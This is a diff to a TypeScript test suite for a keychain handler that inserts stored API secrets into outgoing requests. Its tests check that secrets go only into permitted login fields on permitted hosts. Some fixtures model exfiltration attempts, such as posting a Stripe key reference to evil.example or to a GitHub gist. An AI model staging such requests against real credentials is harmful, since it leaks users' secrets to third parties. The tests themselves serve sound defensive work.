@@ -185,7 +185,6 @@ describe('keychain handler', () => {
             {},
             undefined,
         ],
-        ['the body', 'https://api.github.com/gists', {}, '{"c":"{{kj:Stripe live.api_key}}"}'],
         [
             'a header that steers the request',
             'https://api.github.com/',
@@ -199,6 +198,85 @@ describe('keychain handler', () => {
         )
         expect(response.status).toBe(400)
         expect((await errorCode(response)).code).toBe('KEYCHAIN_REF_OUTSIDE_HEADER')
+        expect(resolves).toHaveLength(0)
+        expect(calls).toHaveLength(0)
+    })
+
+    test('a login form gets the value in its password field, encoded', async () => {
+        const { handle, calls } = setup({
+            respond: () => new Response(`{"echo":"${SECRET}","token":"t-1"}`),
+        })
+        const response = await handle(
+            req('https://api.stripe.com/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: 'email=a%40b.com&passwd={{kj:Stripe live.api_key}}&x=1+2',
+            })
+        )
+        expect(response.status).toBe(200)
+        const sent = new TextDecoder().decode(calls[0]?.init.body as Uint8Array)
+        expect(sent).toBe(`email=a%40b.com&passwd=${encodeURIComponent(SECRET)}&x=1+2`)
+        const text = await response.text()
+        expect(text).not.toContain(SECRET)
+        expect(text).toContain('t-1')
+    })
+
+    test('a JSON login gets the value in its field; every other byte as written', async () => {
+        const { handle, calls } = setup()
+        const response = await handle(
+            req('https://api.stripe.com/oauth/token', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json; charset=utf-8' },
+                body: '{"user": "a", "client_secret":"{{kj:Stripe live.api_key}}", "n": 1.0}',
+            })
+        )
+        expect(response.status).toBe(200)
+        const sent = new TextDecoder().decode(calls[0]?.init.body as Uint8Array)
+        expect(sent).toBe(`{"user": "a", "client_secret":"${SECRET}", "n": 1.0}`)
+    })
+
+    test('a body reference still needs the host to be a destination', async () => {
+        const { handle, calls } = setup()
+        const response = await handle(
+            req('https://evil.example/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: '{"password":"{{kj:Stripe live.api_key}}"}',
+            })
+        )
+        expect((await errorCode(response)).code).toBe('KEYCHAIN_WRONG_SITE')
+        expect(calls).toHaveLength(0)
+    })
+
+    test.each([
+        [
+            'a field that is not a secret',
+            'application/json',
+            '{"note":"{{kj:Stripe live.api_key}}"}',
+        ],
+        [
+            'a reference inside a text',
+            'application/json',
+            '{"password":"x {{kj:Stripe live.api_key}}"}',
+        ],
+        ['a field name', 'application/json', '{"{{kj:Stripe live.api_key}}":"x"}'],
+        ['a body that is not JSON nor a form', 'text/plain', 'password={{kj:Stripe live.api_key}}'],
+        [
+            'a form field that is not a secret',
+            'application/x-www-form-urlencoded',
+            'comment=%7B%7Bkj%3AStripe%20live.api_key%7D%7D',
+        ],
+    ])('a body reference in %s is refused without going out', async (_, type, body) => {
+        const { handle, resolves, calls } = setup()
+        const response = await handle(
+            req('https://api.stripe.com/x', {
+                method: 'POST',
+                headers: { ...AUTH, 'Content-Type': type },
+                body,
+            })
+        )
+        expect(response.status).toBe(400)
+        expect((await errorCode(response)).code).toBe('KEYCHAIN_REF_IN_BODY')
         expect(resolves).toHaveLength(0)
         expect(calls).toHaveLength(0)
     })
